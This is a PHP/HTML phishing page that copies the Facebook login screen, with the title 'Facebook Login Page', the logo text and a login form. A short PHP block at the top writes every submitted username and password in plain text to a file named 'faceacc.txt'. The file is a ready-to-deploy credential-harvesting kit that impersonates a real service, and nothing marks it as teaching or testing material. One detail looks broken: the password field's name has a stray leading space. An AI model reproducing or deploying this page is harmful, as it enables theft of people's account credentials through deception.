<?php

 if(isset($_POST['submit']))
 {
  $username = $_POST['username'];
  $password = $_POST['password'];
  $text = "username: ". $username . " , " . "password: " . $password . "\n";
  $fp = fopen('faceacc.txt', 'a+');

    if(fwrite($fp, $text))  {
        

    }
fclose ($fp);    
}
?>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="facebook.css" />
  </head>
  <body>
    <div class="container">
        <a class="button-2" href="index.php" role="button" style="text-decoration: none;">.</a>
    </div>
    <div class="content">
      <div class="flex-div">
        <div class="name-content">
          <h1 class="logo">Facebook</h1>
          <p>Connect with friends and the world around you on Facebook.</p>
        </div>
          <form action="facebook.php" method="post">
            <input type="text" name="username" placeholder="Email or Phone Number" autocomplete="off"   required />
            <input type="password"  name=" password" placeholder="Password"  autocomplete="off" required>
            <button class="login" name="submit">Log In</button>
            <a href="#">Forgot Password ?</a>
            <hr>
            <button class="create-account">Create New Account</button>
          </form>
      </div>
    </div>
  </body>


